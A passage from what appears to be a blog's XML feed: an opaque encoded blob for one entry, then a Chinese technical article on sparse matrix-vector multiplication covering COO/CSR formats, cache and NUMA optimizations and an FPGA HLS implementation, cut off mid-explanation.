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]]></content>
      <categories>
        <category>Magic</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[SpMV]]></title>
    <url>%2F2019%2F05%2F19%2FSpMV%2F</url>
    <content type="text"><![CDATA[稀疏矩阵向量乘 本文参考: FPGA矩阵计算并行算法与结构(知网) 稀疏矩阵向量乘法xFPGA 稀疏矩阵向量乘法x并行编程方法 稀疏矩阵存储格式总结 深度学习FPGA加速器设计 在矩阵中，若数值为0的元素数目远远多于非0元素的数目，并且非0元素分布没有规律时，则称该矩阵为稀疏矩阵；与之相反，若非0元素数目占大多数时，则称该矩阵为稠密矩阵。定义非零元素的总数比上矩阵所有元素的总数为矩阵的稠密度。SpMV即 Sparse Matrix Vector Multiplication 稀疏矩阵向量乘法的优化稀疏矩阵向量乘法（SPMV）可在很多情况下代替稠密矩阵运算，可以大量节省内存占用，减少计算开销。矩阵向量乘法不同于矩阵和矩阵的乘法，这是完全访存密集型的计算，我们主要的优化方向是提升访存效率或减少访存开销。 稀疏矩阵一般只存储非零元的信息，非零元的存储格式决定了访存的模式，这需要根据非零元的分布模式和要做的计算类型来设计。我们假设分布模式并非对角线分布，整体分布较均匀，局部可能会有聚集，计算类型是稀疏矩阵乘以稠密向量，结果为稠密向量。 标准的稀疏矩阵存储格式主要有：COO（Coordinate Format）和CSR（Compressed Sparse Row）等。COO很简单，就是使用3个数组，分别存储全部非零元的行下标（row index）、列下标（column index）和值（value）；CSR稍复杂，对行下标进行了压缩，假设矩阵行数是m，则压缩后的数组长度为m+1，记作（row ptr），其中第i个元素（0-base）表示矩阵前i行的非零元个数。 图1-1和图1-2展示了COO和CSR格式存储稀疏矩阵的一个例子。 我们来考虑矩阵向量乘法计算y=Ax，其中A是稀疏矩阵，维度是m和n，非零元个数是k；x和y是稠密向量，维度分别是n和m，m×n &gt;&gt; k &gt;&gt; max(m, n)。做这个稀疏矩阵向量乘法就要遍历A的每一行，和x对应位置相乘，把结果累加到y的对应位置。这个过程对A的k个非零元全部访问了一遍，对x也访问了k个元素（重叠），对y访问了一遍，所以优化重点在于减少访问A的冗余，并提升访问x的效率。下面这几个优化标准稀疏矩阵存储格式的方法，可以提升访存效率，减少冗余。 （1）对矩阵A做行列分块处理 对x的访问每次总是从左到右进行稀疏的遍历，如果n很大（比如上百万甚至更多），则访问x的空间局部性较差。所以我们首先改进矩阵A的访问顺序，将矩阵A分解成多个方形的子矩阵。子矩阵的维度适应较高层CPU硬件cache的大小，这样在遍历每一个子矩阵时，对x的访问相对集中于一个较小的区间，这个区间内的x会被cache缓存，这样能够大大提高访问效率。分块方式如图1-3所示。 （2）自适应分块存储结构 由于稀疏矩阵的非零元分布不一定均匀，有的分块会非常稀疏，有的则会相对稠密。对于极稀疏的分块（非零元数量远小于行数），如果用和CSR相似的压缩行存储策略，则会浪费空间，所以用COO的方式反而更能节省存储空间，提高访问效率。 对于哪些分块使用CSR，哪些使用COO方式，可以通过实验的方式确定一个非零元的数量和分块大小的比值。高于该值的用CSR方式存储，否则用COO方式存储。 如图1-4所示，一共使用5个数组存储自适应分块信息的稀疏矩阵，灰色的部分是CSR的相关信息，白色的部分是COO的相关信息。col_idx和vals的意义不变；types存储分块类型，标识当前分块是CSR还是COO；如果当前分块是CSR，则row_info存储类似row_ptr的信息（第k个元素表示分块内第k行的非零元个数），否则存储COO的row_idx的信息；row_id存储每个分块在row_info上的起始地址。 （3）减少下标存储的冗余 矩阵分块后，分块内间址的下标并不需要4字节int型整数存储，比如分块维度在64K以内，可以用2字节的unsigned short来存储。这样，无论是CSR或COO的row_idx、row_ptr，还是col_idx，都可以减少50%的存储空间，并同时提升访存效率。 （4）多线程和NUMA特性 单处理器多核多线程并行计算稀疏矩阵向量乘的过程比较简单，只需把矩阵划分成线程数量的子矩阵。这里采用横切的方法，计算结果不用合并。 但是对于多处理器非一致内存访问（NUMA），就需要对数据在内存中的分布做特殊处理，才能最大程度地利用全部的内存带宽。 一个典型的Intel X86双路服务器的拓扑架构如图1-5所示。 Memory #0是CPU #0的本地内存，Memory #1是CPU #1的本地内存，它们有各自独立的内存带宽。CPU #0访问Memory #1需要经过内部总线（在Intel的架构中叫QPI总线），这个总线的带宽一般小于内存带宽。另外如果要访问的数据只集中在一颗CPU的本地内存中，那么只能利用一个NUMA node的内存带宽，这就限制了系统的总体吞吐。 所以需要把稀疏矩阵的存储均匀地分配到两颗处理器各自的本地内存中。对于一个双CPU，每颗CPU一共4核的系统，需要开8个线程，并把这8个线程分别绑定到8颗CPU核上，使线程的上下文不会在核间迁移。对于每个线程要处理的稀疏矩阵数据，也通过系统调用（在Linux中是mbind），绑定到所在CPU核的本地内存中。这样每个核处理的数据一定是从本地内存中获得的，不会经过QPI总线。这就最大程度地利用了系统内存的带宽。经过实测，这个优化方法可以提升70%左右的内存带宽。 对于我们测试的一个维度大约1M、稀疏度0.0001的稀疏矩阵来说，所有优化加起来，相对Intel MKL库中CSR矩阵的SpMV API加速了2.5x左右。学术界还有很多针对稀疏矩阵存储格式的讨论和研究，其中有些还利用了SIMD向量指令，这里介绍的稀疏矩阵乘法方法，更多是为了讨论内存和cache优化的一些基本原理。稀疏矩阵根据稀疏度和非零元分布的不同，需要使用不同的存储策略，所以遇到实际的稀疏矩阵问题，需要根据实际情况开发不同的存储格式。 FPGA上的稀疏矩阵向量乘稀疏矩阵向量乘法稀疏矩阵向量乘（SpMV）把一个稀疏矩阵与一个向量相乘。稀疏矩阵是指矩阵中大部分元素为0的矩阵。这里的向量本身也可是稀疏的，但通常情况下是密集的。作为一种通用的运算，在科学应用、经济模型、数据挖掘、信息检索中广泛应用。例如，在利用迭代法求解稀疏线性方程组和特征值的问题。同时，也被应用于网页搜索排名和计算机视觉（图像重构等）。 本章会引入几个与HLS相关的新概念，并进一步深入之前讨论过的优化。本章的目标之一是引入一种更复杂的数据结构。我们用压缩行存储（CRS）来保存稀疏矩阵。另一个目标是演示如何进行性能测试。我们编写了简单的激励用来检验设计是否正确。这在硬件设计中十分重要，Vivado®HLS 工具采用HLS C编写激励，并能轻松的对工具生成的RTL代码进行多方面的验证。这是基于HLS设计比基于RTL设计的巨大优势之一。章节中也会讲解如何采用Vivado®HLS工具进行C/RTL联合仿真。不同SpMV设计会带来性能上差异，因为执行时间和稀疏矩阵是密切相关的，所以我们必须通过输入数据来确定任务执行之间的间隔以及任务延迟。 6.1 背景图6.1显示了一个4x4的矩阵M表示的2种方式。其中图6.1-a采用通用的二维方式16个元素来表示矩阵，每个元素存储在自己对应的位置上。图6.1-b采用CRS的方式表示相同的矩阵。CRS 作为一种数据结构，由3个数组组成。值(values)数组保存矩阵中非零元素的值。列索引(columnIndex)数组和行指针（rowPtr）数组对非零元素的位置信息进行编码。列索引存储每一列的元素，行指针包含每一行第一个元素的值。CRS 结构避免存储矩阵中的0值，确实在数值数组中确实没有存储0。但是在这个例子中，虽然数值数组不保存0，但是列索引数组和行指针数组作为标记信息，表示了矩阵的形态。CRS 广泛用于大型的矩阵但是仅仅有少量的非零元素（少于10%或者更低），这样可以简化这类矩阵的存储以及相关的运算。 图 6.1: M是一个4x4矩阵，用两种方式表示：同”密集”矩阵一样存在二维数组之中；作为稀疏矩阵，以行压缩存储的形式保存，行压缩存储是一种由3个数组组成的数据结构。 但是，CRS对矩阵的稀疏性没有要求，可以适用于任何矩阵。作为一种针对矩阵的通用方法，但不见得是最高效的。CRS结构也不见得是表示稀疏矩阵最高效的方式，其他稀疏矩阵表示方法也在被使用。 更准确的讲，CRS作为一种数据结构由3个数组构成：值(values)、列索引(colIndex)、行索引（rowPtr）。值数组和列索引表示稀疏矩阵M中的每一个非零元素，这些数组表示矩阵M采用行的方式，从左到右，从上到下。矩阵中的数据保存在值数组中，列索引数组保存数据在数组中水平方向的位置，如果 values[k] 表示 M_{ij}Mij 其中collndex[k]= jcollnde**x[k]=j。数组rowPtr用n+1n+1的长度来表示n行矩阵。rowPtr[k] 表示在行k之前，矩阵中所有元素的数目，其中rowPtr[0]=0rowPt**r[0]=0且最后一个元素rowPtr[k] 总是表示当前矩阵k行之前所有非零元素的个数M_{ij}Mij ,其中rowPtr[i] \leq k \leq rowPtr[i+1]rowPt**r[i]≤k≤rowPt**r[i+1]。如果行k包含任何非0元素，那么rowPtr[k] 将包含当前行的第一个元素。注意，如果当前行没有非0元素，那么 rowPtr 数组中的值将会重复出现。 从图6.1 a）中，我们可以行优先的方式遍历矩阵，从而确定值（values）数组在CRS中的形式。只要发现一个非0元素，它的值会被保存在下一个索引 ii 中，同时，它的列号columnIndex[i] 会被保存在列数组中。另外，在我们访问一个新行的时候，我们保存下一个值的索引 ii 在rowPtr数组中。所以，rowPtr 数组的第一个元素总是0。从图 6.1 b)中，我们可以把矩阵转换为二位数组表示的方式。第一步是根据rowPtr数组，确定每一行中非0 元素的个数。对行 ii 而言，该行中元素的数目为rowPtr[i]-rowPtr[i+1]rowPt**r[i]−rowPt**r[i+1]的差值。所以当前行的值可以从values数组values[rowPtr[i]] 